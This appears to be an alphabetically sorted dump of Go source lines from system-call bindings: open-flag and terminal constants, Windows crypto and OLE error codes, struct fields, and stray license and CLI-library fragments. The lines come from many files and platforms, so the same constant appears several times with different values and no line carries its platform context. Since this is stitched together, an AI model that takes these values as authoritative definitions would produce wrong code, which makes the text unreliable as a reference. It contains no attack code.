NOTE_OPEN                      = 0x80
NOTE_PCTRLMASK                          = -0x100000
NOTE_PCTRLMASK                    = 0xf0000000
NOTE_PCTRLMASK                 = 0xf0000000
NOTE_PDATAMASK                          = 0xfffff
NOTE_PDATAMASK                    = 0xfffff
NOTE_PDATAMASK                 = 0xfffff
NOTE_READ                      = 0x400
NOTE_REAP                               = 0x10000000
NOTE_RENAME                             = 0x20
NOTE_RENAME                       = 0x20
NOTE_RENAME                    = 0x20
NOTE_REVOKE                             = 0x40
NOTE_REVOKE                       = 0x40
NOTE_REVOKE                    = 0x40
NOTE_SECONDS                            = 0x1
NOTE_SECONDS                   = 0x1
NOTE_SIGNAL                             = 0x8000000
NOTE_TRACK                              = 0x1
NOTE_TRACK                        = 0x1
NOTE_TRACK                     = 0x1
NOTE_TRACKERR                           = 0x2
NOTE_TRACKERR                     = 0x2
NOTE_TRACKERR                  = 0x2
NOTE_TRIGGER                            = 0x1000000
NOTE_TRIGGER                      = 0x1000000
NOTE_TRIGGER                   = 0x1000000
NOTE_TRUNCATE                     = 0x80
NOTE_USECONDS                           = 0x2
NOTE_USECONDS                  = 0x4
NOTE_VM_ERROR                           = 0x10000000
NOTE_VM_PRESSURE                        = 0x80000000
NOTE_VM_PRESSURE_SUDDEN_TERMINATE       = 0x20000000
NOTE_VM_PRESSURE_TERMINATE              = 0x40000000
NOTE_WRITE                              = 0x2
NOTE_WRITE                        = 0x2
NOTE_WRITE                     = 0x2
NOT_USED_ACCESS   = 0
NO_ERROR                                                                                = 0
NO_INHERITANCE                     = 0x0
NO_MULTIPLE_TRUSTEE    = 0
NO_PROPAGATE_INHERIT_ACE           = 0x4
NPROC
NSFS_MAGIC                                  = 0x6e736673
NS_GET_/ 
NS_GET_NSTYPE                    = 0x2000b703
NS_GET_NSTYPE                    = 0xb703
NS_GET_OWNER_UID                 = 0x2000b704
NS_GET_OWNER_UID                 = 0xb704
NS_GET_PARENT                    = 0x2000b702
NS_GET_PARENT                    = 0xb702
NS_GET_USERNS                    = 0x2000b701
NS_GET_USERNS                    = 0xb701
NTE_AUTHENTICATION_IGNORED                                                Handle        = 0x80090031
NTE_BAD_ALGID                                                             Handle        = 0x80090008
NTE_BAD_DATA                                                              Handle        = 0x80090005
NTE_BAD_FLAGS                                                             Handle        = 0x80090009
NTE_BAD_HASH                                                              Handle        = 0x80090002
NTE_BAD_HASH_STATE                                                        Handle        = 0x8009000C
NTE_BAD_KEY                                                               Handle        = 0x80090003
NTE_BAD_KEYSET                                                            Handle        = 0x80090016
NTE_BAD_KEYSET_PARAM                                                      Handle        = 0x8009001F
NTE_BAD_KEY_STATE                                                         Handle        = 0x8009000B
NTE_BAD_LEN                                                               Handle        = 0x80090004
NTE_BAD_PROVIDER                                                          Handle        = 0x80090013
NTE_BAD_PROV_TYPE                                                         Handle        = 0x80090014
NTE_BAD_PUBLIC_KEY                                                        Handle        = 0x80090015
NTE_BAD_SIGNATURE                                                         Handle        = 0x80090006
NTE_BAD_TYPE                                                              Handle        = 0x8009000A
NTE_BAD_UID                                                               Handle        = 0x80090001
NTE_BAD_VER                                                               Handle        = 0x80090007
NTE_BUFFERS_OVERLAP                                                       Handle        = 0x8009002B
NTE_BUFFER_TOO_SMALL                                                      Handle        = 0x80090028
NTE_DECRYPTION_FAILURE                                                    Handle        = 0x8009002C
NTE_DEVICE_NOT_FOUND                                                      Handle        = 0x80090035
NTE_DEVICE_NOT_READY                                                      Handle        = 0x80090030
NTE_DOUBLE_ENCRYPT                                                        Handle        = 0x80090012
NTE_ENCRYPTION_FAILURE                                                    Handle        = 0x80090034
NTE_EXISTS                                                                Handle        = 0x8009000F
NTE_FAIL                                                                  Handle        = 0x80090020
NTE_FIXEDPARAMETER                                                        Handle        = 0x80090025
NTE_HMAC_NOT_SUPPORTED                                                    Handle        = 0x8009002F
NTE_INCORRECT_PASSWORD                                                    Handle        = 0x80090033
NTE_INTERNAL_ERROR                                                        Handle        = 0x8009002D
NTE_INVALID_HANDLE                                                        Handle        = 0x80090026
NTE_INVALID_PARAMETER                                                     Handle        = 0x80090027
NTE_KEYSET_ENTRY_BAD                                                      Handle        = 0x8009001A
NTE_KEYSET_NOT_DEF                                                        Handle        = 0x80090019
NTE_NOT_ACTIVE_CONSOLE                                                    Handle        = 0x80090038
NTE_NOT_FOUND                                                             Handle        = 0x80090011
NTE_NOT_SUPPORTED                                                         Handle        = 0x80090029
NTE_NO_KEY                                                                Handle        = 0x8009000D
NTE_NO_MEMORY                                                             Handle        = 0x8009000E
NTE_NO_MORE_ITEMS                                                         Handle        = 0x8009002A
NTE_OP_OK                                                                 syscall.Errno = 0
NTE_PASSWORD_CHANGE_REQUIRED                                              Handle        = 0x80090037
NTE_PERM                                                                  Handle        = 0x80090010
NTE_PROVIDER_DLL_FAIL                                                     Handle        = 0x8009001D
NTE_PROV_DLL_NOT_FOUND                                                    Handle        = 0x8009001E
NTE_PROV_TYPE_ENTRY_BAD                                                   Handle        = 0x80090018
NTE_PROV_TYPE_NOT_DEF                                                     Handle        = 0x80090017
NTE_PROV_TYPE_NO_MATCH                                                    Handle        = 0x8009001B
NTE_SIGNATURE_FILE_BAD                                                    Handle        = 0x8009001C
NTE_SILENT_CONTEXT                                                        Handle        = 0x80090022
NTE_SYS_ERR                                                               Handle        = 0x80090021
NTE_TEMPORARY_PROFILE                                                     Handle        = 0x80090024
NTE_TOKEN_KEYSET_STORAGE_FULL                                             Handle        = 0x80090023
NTE_UI_REQUIRED                                                           Handle        = 0x8009002E
NTE_USER_CANCELLED                                                        Handle        = 0x80090036
NTE_VALIDATION_FAILED                                                     Handle        = 0x80090032
NTF_EXT_LEARNED    = 0x10
NTF_MASTER         = 0x4
NTF_OFFLOADED      = 0x20
NTF_PROXY          = 0x8
NTF_ROUTER         = 0x80
NTF_SELF           = 0x2
NTF_USE            = 0x1
NTString) Slice() []byte {
NTString) String() string {
NTUnicodeString
NTUnicodeString) Slice() []uint16 {
NTUnicodeString) String() string {
NUD_DELAY          = 0x8
NUD_FAILED         = 0x20
NUD_INCOMPLETE     = 0x1
NUD_NOARP          = 0x40
NUD_NONE           = 0x0
NUD_PERMANENT      = 0x80
NUD_PROBE          = 0x10
NUD_REACHABLE      = 0x2
NUD_STALE          = 0x4
NUM_CR_RESULTS              CONFIGRET = 0x0000003C
N_priv_flags uint32
N_stats      uint32
Name 
Name    
Name     
Name      
Name       
Name        
Name         
Name                    
Name                string              // name as it appears on command line
Name             [64]int8
Name             [64]uint8
Name            [32]int8
Name            [MAX_INTERFACE_NAME_LEN]uint16
Name          string
Name         [128]byte
Name         [256]int8
Name        [64]int8
Name        [64]uint8
Name      [16]uint8
Name      [512]int8
Name    [1024]int8
Name    [16]int8
Name    [256]int8
Name    [8]int8
Name    string
Name    uint64
Name   [1]int8
Name   [256]byte
Name   [256]int8
Name   [256]uint8
Name   [32]int8
Name   [64]uint8
Name   string
Name   string // last element of path
Name [0]byte
Name [96]byte
Name [IFNAMSIZ]byte
Name string
NameCanonical        = 7
NameCanonicalEx      = 9
NameDisplay          = 3
NameDnsDomain        = 12
NameExchange 
NameFullyQualifiedDN = 1
NameSamCompatible    = 2
NameServicePrincipal = 10
NameUniqueId         = 6
NameUnknown          = 0
NameUserPrincipal    = 8
Name_max  int32
Namelen      uint32
Namelen     int32
Namelen    int32
Namelen    uint32
Namelen int32
Namelen int64
Namelen uint32
Namelen uint64
Namemax     uint32
Namemax     uint64
Namemax  uint64
Namemax31   uint32
Namlen       uint8
Namlen    uint16
Namlen  uint16
Namlen uint16
Namlen uint8
NandEcclayout struct {
NandOobfree struct {
NandOobinfo struct {
Nanon              int32
Nanonneeded        int32
Nanosleep(time 
Nattch     uint32
Nattch uint16
Nattch uint64
Negmult int32
Net         uint16
Net       uint16
Net     uint16
NetApiBufferFree(buf 
NetGetJoinInformation(server 
NetSetupDomainName
NetSetupUnjoined
NetSetupUnknownStatus = iota
NetSetupWorkgroupName
NetUserGetInfo(serverName 
Netmask          SockaddrGen
NetworkByteOrder  int32
New behavior
NewSemver
Next    
Next     
Next      
Next         
Next               
Next                
Next                  
Next         uint32
Next    uint32
Next uint32
NextEntryOffset              uint32
NextEntryOffset uint32
Next_offset uint32
Nfc_protocol     uint32
Nfc_protocol uint32
Nfgen_family uint8
Nfreeanon          int32
Ngroups int16
Nip       uint32
Nip       uint64
Nivcsw                    uint64
Nivcsw   int32
Nivcsw   int64
Nlen   uint8
Nlink           uint32
Nlink          uint32
Nlink        int32
Nlink      uint32
Nlink    int16
Nlink   uint16
Nlink   uint32
Nlink   uint64
No file completion by default (opposite of bash)
NoArgs
NoOptDefVal         string              // default value (as text)
NoPasswd        bool
Node uint32
Nodeid  [8]int8
Nodename   [65]byte
Nodename [256]byte
Nodename [257]byte
Nodename [32]byte
None of the contents of this document are legally binding in any way to the maintainers or the users.
Noproto      uint64
Noproto     uint32
Noproto     uint64
Noproto    uint32
Noproto    uint64
NotAfter             Filetime
NotBefore            Filetime
Note
Note 1
Note 2
Note 3
Note that without declaring 
Note:
Notice that calling 
Notice we put the 
NotificationStatus    uint32
NotificationTriggered uint32
NotifyCallback        uintptr
Noun completion
Npages             int32
Nsec        uint32
Nsec      int32
Nsec      uint32
Nsec  int32
Nsec int32
Nsec int64
Nsec uint32
Nsignals int32
Nsignals int64
Nswap    int32
Nswap    int64
Nswapdev           int32
Nswget             int32
NtCreateFile(handle 
NtCreateNamedPipeFile(pipe 
Ntohs(netshort uint16) (u uint16) = ws2_32.ntohs
NullUUID) Scan(value interface{}) error {
NullUUID) UnmarshalBinary(data []byte) error {
NullUUID) UnmarshalJSON(data []byte) error {
NullUUID) UnmarshalText(data []byte) error {
Num             int32
NumElements                uint32
Num_pkts            uint32
Number           int32
Number           uint32
Number  uint8
NumberOfLinks      uint32
NumberOfModules uint32
NumberOfThreads              uint32
NumberOfThreadsHighWatermark uint32
Numblocks   uint32
Nvcsw                     uint64
Nvcsw    int32
Nvcsw    int64
OBJECTS_AND_NAME) TrusteeValue {
OBJECTS_AND_SID) TrusteeValue {
OBJECT_INHERIT_ACE                 = 0x1
OBJ_CASE_INSENSITIVE              = 0x00000040
OBJ_DONT_REPARSE                  = 0x00001000
OBJ_EXCLUSIVE                     = 0x00000020
OBJ_FORCE_ACCESS_CHECK            = 0x00000400
OBJ_IGNORE_IMPERSONATED_DEVICEMAP = 0x00000800
OBJ_INHERIT                       = 0x00000002
OBJ_KERNEL_HANDLE                 = 0x00000200
OBJ_OPENIF                        = 0x00000080
OBJ_OPENLINK                      = 0x00000100
OBJ_PERMANENT                     = 0x00000010
OBJ_VALID_ATTRIBUTES              = 0x00001FF2
OCFS2_SUPER_MAGIC                           = 0x7461636f
OCRNL                                       = 0x8
OCRNL                                   = 0x10
OCRNL                             = 0x10
OCRNL                          = 0x10
OCRNL                         = 0x8
OFDEL                                       = 0x80
OFDEL                                   = 0x20000
OFDEL                         = 0x80
OFF)$/ 
OFILL                                       = 0x40
OFILL                                   = 0x80
OFILL                         = 0x40
OFIOGETBMAP                       = 0xc004667a
OLCUC                             = 0x20
OLCUC                            = 0x2
OLCUC                            = 0x4
OLCUC                         = 0x2
OLDDEV                        = 0x0
OLEOBJ_E_FIRST                                                            syscall.Errno = 0x80040180
OLEOBJ_E_INVALIDVERB                                                      Handle        = 0x80040181
OLEOBJ_E_LAST                                                             syscall.Errno = 0x8004018F
OLEOBJ_E_NOVERBS                                                          Handle        = 0x80040180
OLEOBJ_S_CANNOT_DOVERB_NOW                                                Handle        = 0x00040181
OLEOBJ_S_FIRST                                                            syscall.Errno = 0x00040180
OLEOBJ_S_INVALIDHWND                                                      Handle        = 0x00040182
OLEOBJ_S_INVALIDVERB                                                      Handle        = 0x00040180
OLEOBJ_S_LAST                                                             syscall.Errno = 0x0004018F
OLE_E_ADVF                                                                Handle        = 0x80040001
OLE_E_ADVISENOTSUPPORTED                                                  Handle        = 0x80040003
OLE_E_BLANK                                                               Handle        = 0x80040007
OLE_E_CANTCONVERT                                                         Handle        = 0x80040011
OLE_E_CANT_BINDTOSOURCE                                                   Handle        = 0x8004000A
OLE_E_CANT_GETMONIKER                                                     Handle        = 0x80040009
OLE_E_CLASSDIFF                                                           Handle        = 0x80040008
OLE_E_ENUM_NOMORE                                                         Handle        = 0x80040002
OLE_E_FIRST                                                               Handle        = 0x80040000
OLE_E_INVALIDHWND                                                         Handle        = 0x8004000F
OLE_E_INVALIDRECT                                                         Handle        = 0x8004000D
OLE_E_LAST                                                                Handle        = 0x800400FF
OLE_E_NOCACHE                                                             Handle        = 0x80040006
OLE_E_NOCONNECTION                                                        Handle        = 0x80040004
OLE_E_NOSTORAGE                                                           Handle        = 0x80040012
OLE_E_NOTRUNNING                                                          Handle        = 0x80040005
OLE_E_NOT_INPLACEACTIVE                                                   Handle        = 0x80040010
OLE_E_OLEVERB                                                             Handle        = 0x80040000
OLE_E_PROMPTSAVECANCELLED                                                 Handle        = 0x8004000C
OLE_E_STATIC                                                              Handle        = 0x8004000B
OLE_E_WRONGCOMPOBJ                                                        Handle        = 0x8004000E
OLE_S_FIRST                                                               Handle        = 0x00040000
OLE_S_LAST                                                                Handle        = 0x000400FF
OLE_S_MAC_CLIPFORMAT                                                      Handle        = 0x00040002
OLE_S_STATIC                                                              Handle        = 0x00040001
OLE_S_USEREG                                                              Handle        = 0x00040000
ONBITSMAJOR                   = 0x7
ONBITSMINOR                   = 0x8
ONLCR                                   = 0x2
ONLCR                             = 0x2
ONLCR                            = 0x2
ONLCR                            = 0x4
ONLCR                           = 0x0004
ONLCR                          = 0x2
ONLCR                         = 0x4
ONLRET                                      = 0x20
ONLRET                                  = 0x40
ONLRET                            = 0x40
ONLRET                            = 0x80
ONLRET                         = 0x40
ONLRET                        = 0x20
ONL_CONNECTION_COUNT_LIMIT                                                Handle        = 0x8086000D
ONL_E_ACCESS_DENIED_BY_TOU                                                Handle        = 0x80860002
ONL_E_ACCOUNT_LOCKED                                                      Handle        = 0x80860007
ONL_E_ACCOUNT_SUSPENDED_ABUSE                                             Handle        = 0x8086000B
ONL_E_ACCOUNT_SUSPENDED_COMPROIMISE                                       Handle        = 0x8086000A
ONL_E_ACCOUNT_UPDATE_REQUIRED                                             Handle        = 0x80860005
ONL_E_ACTION_REQUIRED                                                     Handle        = 0x8086000C
ONL_E_CONNECTED_ACCOUNT_CAN_NOT_SIGNOUT                                   Handle        = 0x8086000E
ONL_E_EMAIL_VERIFICATION_REQUIRED                                         Handle        = 0x80860009
ONL_E_FORCESIGNIN                                                         Handle        = 0x80860006
ONL_E_INVALID_APPLICATION                                                 Handle        = 0x80860003
ONL_E_INVALID_AUTHENTICATION_TARGET                                       Handle        = 0x80860001
ONL_E_PARENTAL_CONSENT_REQUIRED                                           Handle        = 0x80860008
ONL_E_PASSWORD_UPDATE_REQUIRED                                            Handle        = 0x80860004
ONL_E_REQUEST_THROTTLED                                                   Handle        = 0x80860010
ONL_E_USER_AUTHENTICATION_REQUIRED                                        Handle        = 0x8086000F
ONOCR                                       = 0x10
ONOCR                                   = 0x20
ONOCR                             = 0x20
ONOCR                             = 0x40
ONOCR                          = 0x20
ONOCR                         = 0x10
ONOEOT                                  = 0x8
ONOEOT                            = 0x8
ONOEOT                         = 0x8
ONOEOT                        = 0x80000
OPENFAIL                      = -0x1
OPENPROM_SUPER_MAGIC                        = 0x9fa1
OPEN_ALWAYS       = 4
OPEN_EXISTING     = 3
OPEN_TREE_CLOEXEC = 0x400000
OPEN_TREE_CLOEXEC = 0x80000
OPEN_TREE_CLONE = 0x1
OPOST                                       = 0x1
OPOST                                   = 0x1
OPOST                             = 0x1
OPOST                           = 0x0001
OPOST                          = 0x1
OPOST                         = 0x1
OR_INVALID_OID                                                            syscall.Errno = 1911
OR_INVALID_OXID                                                           syscall.Errno = 1910
OR_INVALID_SET                                                            syscall.Errno = 1912
OS(RELEASE
OSS_ACCESS_SERIALIZATION_ERROR                                            Handle        = 0x80093013
OSS_API_DLL_NOT_LINKED                                                    Handle        = 0x80093029
OSS_BAD_ARG                                                               Handle        = 0x80093006
OSS_BAD_ENCRULES                                                          Handle        = 0x80093016
OSS_BAD_PTR                                                               Handle        = 0x8009300B
OSS_BAD_TABLE                                                             Handle        = 0x8009300F
OSS_BAD_TIME                                                              Handle        = 0x8009300C
OSS_BAD_VERSION                                                           Handle        = 0x80093007
OSS_BERDER_DLL_NOT_LINKED                                                 Handle        = 0x8009302A
OSS_CANT_CLOSE_TRACE_FILE                                                 Handle        = 0x8009302E
OSS_CANT_OPEN_TRACE_FILE                                                  Handle        = 0x8009301B
OSS_CANT_OPEN_TRACE_WINDOW                                                Handle        = 0x80093018
OSS_COMPARATOR_CODE_NOT_LINKED                                            Handle        = 0x80093025
OSS_COMPARATOR_DLL_NOT_LINKED                                             Handle        = 0x80093024
OSS_CONSTRAINT_DLL_NOT_LINKED                                             Handle        = 0x80093023
OSS_CONSTRAINT_VIOLATED                                                   Handle        = 0x80093011
OSS_COPIER_DLL_NOT_LINKED                                                 Handle        = 0x80093022
OSS_DATA_ERROR                                                            Handle        = 0x80093005
OSS_FATAL_ERROR                                                           Handle        = 0x80093012
OSS_INDEFINITE_NOT_SUPPORTED                                              Handle        = 0x8009300D
OSS_LIMITED                                                               Handle        = 0x8009300A
OSS_MEM_ERROR                                                             Handle        = 0x8009300E
OSS_MEM_MGR_DLL_NOT_LINKED                                                Handle        = 0x80093026
OSS_MORE_BUF                                                              Handle        = 0x80093001
OSS_MORE_INPUT                                                            Handle        = 0x80093004
OSS_MUTEX_NOT_CREATED                                                     Handle        = 0x8009302D
OSS_NEGATIVE_UINTEGER                                                     Handle        = 0x80093002
OSS_NULL_FCN                                                              Handle        = 0x80093015
OSS_NULL_TBL                                                              Handle        = 0x80093014
OSS_OID_DLL_NOT_LINKED                                                    Handle        = 0x8009301A
OSS_OPEN_TYPE_ERROR                                                       Handle        = 0x8009302C
OSS_OUT_MEMORY                                                            Handle        = 0x80093008
OSS_OUT_OF_RANGE                                                          Handle        = 0x80093021
OSS_PDU_MISMATCH                                                          Handle        = 0x80093009
OSS_PDU_RANGE                                                             Handle        = 0x80093003
OSS_PDV_CODE_NOT_LINKED                                                   Handle        = 0x80093028
OSS_PDV_DLL_NOT_LINKED                                                    Handle        = 0x80093027
OSS_PER_DLL_NOT_LINKED                                                    Handle        = 0x8009302B
OSS_REAL_CODE_NOT_LINKED                                                  Handle        = 0x80093020
OSS_REAL_DLL_NOT_LINKED                                                   Handle        = 0x8009301F
OSS_TABLE_MISMATCH                                                        Handle        = 0x8009301D
OSS_TOO_LONG                                                              Handle        = 0x80093010
OSS_TRACE_FILE_ALREADY_OPEN                                               Handle        = 0x8009301C
OSS_TYPE_NOT_SUPPORTED                                                    Handle        = 0x8009301E
OSS_UNAVAIL_ENCRULES                                                      Handle        = 0x80093017
OSS_UNIMPLEMENTED                                                         Handle        = 0x80093019
OTHER DEALINGS IN THE SOFTWARE.
OTP/ 
OTPERASE                         = 0x400c4d19
OTPERASE                         = 0x800c4d19
OTPGETREGIONCOUNT                = 0x40044d0e
OTPGETREGIONCOUNT                = 0x80044d0e
OTPGETREGIONINFO                 = 0x400c4d0f
OTPGETREGIONINFO                 = 0x800c4d0f
OTPLOCK                          = 0x400c4d10
OTPLOCK                          = 0x800c4d10
OTPSELECT                        = 0x40044d0d
OTPSELECT                        = 0x80044d0d
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
OVERLAYFS_SUPER_MAGIC                       = 0x794c7630
OWNERPT = (int32('P') << 8) 
OWNER_SECURITY_INFORMATION            = 0x00000001
OXTABS                                  = 0x4
OXTABS                            = 0x4
OXTABS                         = 0x4
OXTABS                        = 0x40000
O[CNPFPL][A-Z]
O[CNPFP][A-Z]
O_ACCMODE                                   = 0x3
O_ACCMODE                               = 0x3
O_ACCMODE                         = 0x3
O_ACCMODE                       = 0x03
O_ACCMODE                      = 0x3
O_ACCMODE                     = 0x23
O_ACCMODE                     = 0x600003
O_ALERT                                 = 0x20000000
O_ALT_IO                          = 0x40000
O_APPEND                                = 0x8
O_APPEND                          = 0x8
O_APPEND                         = 0x400
O_APPEND                         = 0x8
O_APPEND                        = 0x08
O_APPEND                       = 0x8
O_APPEND                      = 0x8
O_APPEND   = 0x00400
O_APPEND != 0 {
O_ASYNC                                 = 0x40
O_ASYNC                           = 0x40
O_ASYNC                          = 0x1000
O_ASYNC                          = 0x2000
O_ASYNC                          = 0x40
O_ASYNC                        = 0x40
O_ASYNC    = 0x00000
O_ASYNC    = 0x02000
O_ASYNCSIG                      = 0x0200
O_CIO                         = 0x80
O_CIOR                        = 0x800000000
O_CLOEXEC                               = 0x1000000
O_CLOEXEC                         = 0x10000
O_CLOEXEC                         = 0x20000
O_CLOEXEC                         = 0x400000
O_CLOEXEC                        = 0x400000
O_CLOEXEC                        = 0x80000
O_CLOEXEC                      = 0x100000
O_CLOEXEC                     = 0x800000
O_CLOEXEC  = 0x80000
O_CLOEXEC = 0       // Dummy value (not supported).
O_CLOEXEC = 32
O_CLOEXEC == 0 {
O_CREAT                                 = 0x200
O_CREAT                           = 0x200
O_CREAT                          = 0x100
O_CREAT                          = 0x200
O_CREAT                          = 0x40
O_CREAT                         = 0x80
O_CREAT                        = 0x200
O_CREAT                       = 0x100
O_CREAT    = 0x00040
O_CREAT    = 0x02000
O_CREAT != 0 {
O_CREAT == O_CREAT:
O_DEFER                       = 0x2000
O_DELAY                       = 0x4000
O_DIRECT                          = 0x10000
O_DIRECT                          = 0x80000
O_DIRECT                         = 0x10000
O_DIRECT                         = 0x100000
O_DIRECT                         = 0x20000
O_DIRECT                         = 0x4000
O_DIRECT                         = 0x8000
O_DIRECT                       = 0x10000
O_DIRECT                      = 0x2000000
O_DIRECT                      = 0x8000000
O_DIRECTORY                             = 0x100000
O_DIRECTORY                       = 0x20000
O_DIRECTORY                       = 0x200000
O_DIRECTORY                       = 0x8000000
O_DIRECTORY                      = 0x10000
O_DIRECTORY                      = 0x4000
O_DIRECTORY                    = 0x20000
O_DIRECTORY                   = 0x1000000
O_DIRECTORY                   = 0x80000
O_DP_GETRAWENCRYPTED                    = 0x1
O_DP_GETRAWUNENCRYPTED                  = 0x2
O_DSYNC                                 = 0x400000
O_DSYNC                           = 0x10000
O_DSYNC                           = 0x80
O_DSYNC                          = 0x10
O_DSYNC                          = 0x1000
O_DSYNC                          = 0x2000
O_DSYNC                       = 0x40
O_DSYNC                       = 0x400000
O_EFSOFF                      = 0x400000000
O_EFSON                       = 0x200000000
O_EVTONLY                               = 0x8000
O_EXCL                                  = 0x800
O_EXCL                            = 0x800
O_EXCL                           = 0x400
O_EXCL                           = 0x80
O_EXCL                           = 0x800
O_EXCL                          = 0x40
O_EXCL                         = 0x800
O_EXCL                        = 0x400
O_EXCL     = 0x00080
O_EXCL    = 0x1000
O_EXCL) == (O_CREAT 
O_EXEC                         = 0x40000
O_EXEC                        = 0x20
O_EXEC                        = 0x400000
O_EXLOCK                                = 0x20
O_EXLOCK                          = 0x20
O_EXLOCK                       = 0x20
O_FAPPEND                         = 0x100000
O_FASYNCWRITE                     = 0x800000
O_FBLOCKING                       = 0x40000
O_FMASK                           = 0xfc0000
O_FNONBLOCKING                    = 0x80000
O_FOFFSET                         = 0x200000
O_FSYNC                                 = 0x80
O_FSYNC                           = 0x80
O_FSYNC                          = 0x101000
O_FSYNC                          = 0x4010
O_FSYNC                          = 0x802000
O_FSYNC                        = 0x80
O_FSYNCWRITE                      = 0x400000
O_GETFL                         = 0x0F
O_LARGEFILE                      = 0x0
O_LARGEFILE                      = 0x10000
O_LARGEFILE                      = 0x2000
O_LARGEFILE                      = 0x20000
O_LARGEFILE                      = 0x8000
O_LARGEFILE                     = 0x0400
O_LARGEFILE                   = 0x2000
O_LARGEFILE                   = 0x4000000
O_NDELAY                                = 0x4
O_NDELAY                          = 0x4
O_NDELAY                         = 0x4004
O_NDELAY                         = 0x80
O_NDELAY                         = 0x800
O_NDELAY                       = 0x4
O_NDELAY                      = 0x4
O_NDELAY                      = 0x8000
O_NOATIME                        = 0x200000
O_NOATIME                        = 0x40000
O_NOCACHE                     = 0x100000
O_NOCTTY                                = 0x20000
O_NOCTTY                          = 0x8000
O_NOCTTY                         = 0x100
O_NOCTTY                         = 0x800
O_NOCTTY                         = 0x8000
O_NOCTTY                        = 0x20
O_NOCTTY                       = 0x8000
O_NOCTTY                      = 0x800
O_NOCTTY   = 0x00000
O_NOCTTY   = 0x00100
O_NOFOLLOW                              = 0x100
O_NOFOLLOW                        = 0x100
O_NOFOLLOW                       = 0x20000
O_NOFOLLOW                       = 0x8000
O_NOFOLLOW                     = 0x100
O_NOFOLLOW                    = 0x1000000
O_NOFOLLOW                    = 0x20000
O_NOFOLLOW_ANY                          = 0x20000000
O_NOLINKS                     = 0x40000
O_NONBLOCK
O_NONBLOCK                              = 0x4
O_NONBLOCK                        = 0x4
O_NONBLOCK                       = 0x4000
O_NONBLOCK                       = 0x80
O_NONBLOCK                       = 0x800
O_NONBLOCK                      = 0x04
O_NONBLOCK                     = 0x4
O_NONBLOCK                    = 0x4
O_NONBLOCK                    = 0x80
O_NONBLOCK = 0x00000
O_NONBLOCK = 0x00800
O_NONE                        = 0x3
O_NOSIGPIPE                       = 0x1000000
O_NSHARE                      = 0x10000
O_PATH                           = 0x1000000
O_PATH                           = 0x200000
O_POPUP                                 = 0x80000000
O_RAW                         = 0x100000000
O_RDONLY                                    = 0x0
O_RDONLY                                = 0x0
O_RDONLY                          = 0x0
O_RDONLY                        = 0x02
O_RDONLY                       = 0x0
O_RDONLY                      = 0x0
O_RDONLY   = 0x00000
O_RDONLY  = 0
O_RDWR                                      = 0x2
O_RDWR                                  = 0x2
O_RDWR                            = 0x2
O_RDWR                          = 0x03
O_RDWR                         = 0x2
O_RDWR                        = 0x2
O_RDWR     = 0x00002
O_RDWR    = 2
O_RSHARE                      = 0x1000
O_RSYNC                           = 0x20000
O_RSYNC                           = 0x80
O_RSYNC                          = 0x101000
O_RSYNC                          = 0x4010
O_RSYNC                          = 0x802000
O_RSYNC                       = 0x200000
O_RSYNC                       = 0x8000
O_SEARCH                      = 0x20
O_SEARCH                      = 0x200000
O_SHLOCK                                = 0x10
O_SHLOCK                          = 0x10
O_SHLOCK                       = 0x10
O_SIOCGIFCONF                 = -0x3ff796ec
O_SIOCGLIFCONF                = -0x3fef9688
O_SNAPSHOT                    = 0x40
O_SYMLINK                               = 0x200000
O_SYNC                                  = 0x80
O_SYNC                            = 0x80
O_SYNC                           = 0x101000
O_SYNC                           = 0x4010
O_SYNC                           = 0x802000
O_SYNC                          = 0x0100
O_SYNC                         = 0x80
O_SYNC                        = 0x10
O_SYNC     = 0x00000
O_SYNC     = 0x01000
O_TMPFILE                        = 0x2010000
O_TMPFILE                        = 0x404000
O_TMPFILE                        = 0x410000
O_TRUNC                                 = 0x400
O_TRUNC                           = 0x400
O_TRUNC                          = 0x200
O_TRUNC                          = 0x400
O_TRUNC                         = 0x10
O_TRUNC                        = 0x400
O_TRUNC                       = 0x200
O_TRUNC    = 0x00200
O_TRUNC   = 16
O_TRUNC == O_TRUNC:
O_TRUNC) == (O_CREAT 
O_TTY_INIT                     = 0x80000
O_TTY_INIT                    = 0x0
O_VERIFY                       = 0x200000
O_WRONLY
O_WRONLY                                    = 0x1
O_WRONLY                                = 0x1
O_WRONLY                          = 0x1
O_WRONLY                        = 0x01
O_WRONLY                       = 0x1
O_WRONLY                      = 0x1
O_WRONLY   = 0x00001
O_WRONLY  = 1
O_XATTR                       = 0x4000
ObjId    
ObjId      
ObjName string
Object uint64
ObjectName         
ObjectType              SE_OBJECT_TYPE
ObjectTypeGuid          GUID
ObjectTypeName          
ObjectsPresent          uint32
Obsolete_swapins   int32
Obsolete_swapouts  int32
Obytes       uint64
Obytes      uint32
Obytes      uint64
Obytes     uint32
Obytes     uint64
Oerrors      uint64
Oerrors     uint32
Oerrors     uint64
Oerrors    uint32
Oerrors    uint64
Off          int64
Off    int64
Offs 
Offset           int32
Offset           uint64
Offset         int64
Offset       uint32
Offset      uint32
Offset     int64
Offset    int32
Offset    int64
Offset int64
Offset uint32
Offset uint64
OffsetHigh   uint32
OffsetToFileName uint16
Offset_to_first_pkt uint32
Oflag  uint32
Oflag  uint64
Oflag uint16
Oflag uint32
OidSpecificInfo  Pointer
Old behavior
Omcasts      uint64
Omcasts     uint32
Omcasts     uint64
Omcasts    uint32
Omcasts    uint64
OnLinkPrefixLength uint8
OnOff    uint32
OnlyValidArgs
Onoff  int32
Onoff  uint16
Oob    uint64
Oobavail uint32
Oobfree  [8]NandOobfree
Oobfree  [8][2]uint32
Ooblen uint64
Oobsize   uint32
Op      int32
Op   int32
Opackets     uint64
Opackets    uint32
Opackets    uint64
Opackets   uint32
Opackets   uint64
OpenSCManager(machineName 
Open_count   int32
OperStatus            uint32
OperStatus      uint32
Options             uint32
Options        uint8
Options  uint32
Options uint32
Opts_len  uint16
Oqdrops      uint64
Oqdrops    uint64
Or you can create custom flags that satisfy the Value interface (with
Org    = Domain(2)
Orig_a0  uint64
Orig_eax int32
Orig_gpr2                uint64
Orig_gpr3 uint32
Orig_gpr3 uint64
Orig_rax uint64
Origin uint8
OsVersionInfoEx {
OsVersionInfoEx) (ntstatus error) = ntdll.RtlGetVersion
OsVersionInfoEx) (ntstatus error) {
OsVersionInfoEx{}
Ospeed int32
Ospeed uint32
Ospeed uint64
OtherOperationCount          int64
OtherOperationCount uint64
OtherTransferCount           int64
OtherTransferCount  uint64
OtpInfo struct {
Oublock  int32
Oublock  int64
OutDiscards     uint32
OutErrors       uint32
OutNUcastPkts   uint32
OutOctets       uint32
OutQLen         uint32
OutUcastPkts    uint32
